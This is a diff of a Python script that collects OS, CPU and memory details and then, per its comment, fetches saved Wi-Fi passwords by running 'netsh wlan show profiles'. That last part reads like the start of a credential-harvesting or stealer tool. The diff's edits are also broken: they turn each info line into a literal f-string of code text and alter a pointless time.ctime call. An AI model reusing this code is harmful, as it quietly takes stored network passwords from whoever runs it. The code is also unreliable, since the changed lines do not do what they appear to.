@@ -20,17 +20,17 @@ cpuFrequency = psutil.cpu_freq().max
 memorySize = round(psutil.virtual_memory().total / (1024.0 **3))
 
 #print system information
-A=("OS Name : " + osName)
-B=("OS Version : " + osVersion)
-C=("OS Architecture : " + osArchitecture)
+A=f'("OS Name : " + osName)'
+B=f'("OS Version : " + osVersion)'
+C=f'("OS Architecture : " + osArchitecture)'
 
 #print CPU information
-D=("CPU Name : " + cpuName)
-E=("Number of CPU Cores : " + str(cpuCores))
-F=("CPU Frequency : " + str(cpuFrequency) + "Mhz")
+D=f'("CPU Name : " + cpuName)'
+E=f'("Number of CPU Cores : " + str(cpuCores))'
+F=f'("CPU Frequency : " + str(cpuFrequency) + "Mhz")'
 
 #print memory information
-G=("Memory Size : " + str(memorySize) + "GB")
+G=f'("Memory Size : " + str(memorySize) + "GB")'
 
 Z =(A,B,C)
 Y =(D,)
@@ -38,7 +38,7 @@ X =(E,F,G)
 W =tuple(Z+Y)+tuple(X)
 V =str(W)
 
-time.ctime(20)
+time.ctime(300)
 
 #fetching saved wifi password using subprocess
 data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
